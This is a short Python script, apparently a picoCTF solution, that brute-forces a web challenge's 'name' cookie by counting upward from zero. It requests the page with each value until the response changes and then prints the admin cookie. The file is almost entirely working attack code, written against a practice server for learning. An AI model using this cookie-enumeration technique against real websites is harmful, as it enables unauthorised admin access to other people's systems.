import requests
from itertools import combinations, product
import base64
import threading


#brute-force cookies attack
url = "http://mercury.picoctf.net:27177/"

cookie = 0
while (True):
    cookies = {'name': f"{cookie}"}
    response = requests.get(url, cookies=cookies)
    if (response.text.find("That is a cookie! Not very special though") == -1):
        print(f"Cookie of admin is {cookie}")
        print(response.text)
        break
    else:
        print(f"{cookie} is not an admin cookie")
    cookie = cookie + 1